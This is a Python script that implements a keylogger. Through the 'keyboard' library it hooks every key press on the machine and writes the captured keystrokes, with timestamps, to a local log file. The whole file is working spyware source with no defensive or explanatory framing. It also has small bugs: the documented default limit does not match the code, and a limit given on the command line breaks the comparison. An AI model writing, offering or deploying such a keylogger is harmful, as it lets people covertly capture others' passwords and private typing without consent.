#!/usr/bin/env python3

from _datetime import datetime
from argparse import ArgumentParser

import keyboard


def get_arguments():
    parser = ArgumentParser()
    parser.add_argument('-o', '--output', dest='output',
                        help='Optional. A file path where keylogger should write captured strokes. '
                             'If this argument was not provided, '
                             'then keylogger will log all events in its current working directory '
                             'in the keylogger.log file')
    parser.add_argument('-l', '--limit', dest='limit',
                        help='Optional. '
                             'Specify a limit for buttons hits to be collected before writing them in the journal. '
                             'Default is 100.')
    options = parser.parse_args()
    if not options.output:
        options.output = './keylogger.log'
    if not options.limit:
        options.limit = 50
    return options


class Keylogger:
    def __init__(self, output_file_name, hits_limit_before_flush):
        self.start_time = datetime.now()
        self.log = []
        self.output_file_name = output_file_name
        self.hits_limit = hits_limit_before_flush

    def sniff(self):
        keyboard.hook(
            lambda event: self.save(event) if event.event_type == 'down' else None)
        while True:
            pass

    def save(self, event):
        self.log.append(self.normalize_event(event))
        log_messages_size = len(self.log)
        if log_messages_size > self.hits_limit:
            self.store_events()
            self.log.clear()

    def store_events(self):
        self.save_to_file("[*] Start time: " + self.datetime_to_string(self.start_time))
        self.save_to_file(''.join(self.log))
        self.save_to_file("[*] End time: " + self.datetime_to_string(datetime.now()))

    def save_to_file(self, message):
        with open(self.output_file_name, 'a+') as log:
            print(message, file=log)

    @staticmethod
    def normalize_event(event):
        special_buttons = ['ctrl', 'shift', 'alt', 'enter', 'esc', 'tab']
        if event.name in special_buttons:
            return f'\n[{event.name}]\n'
        else:
            return event.name

    @staticmethod
    def datetime_to_string(datetime_obj):
        return datetime_obj.strftime('%H:%M:%S %m/%d/%Y')


def __main__():
    options = get_arguments()
    keylogger = Keylogger(options.output, options.limit)
    try:
        keylogger.sniff()
    except:
        keylogger.store_events()


if __name__ == '__main__':
    __main__()
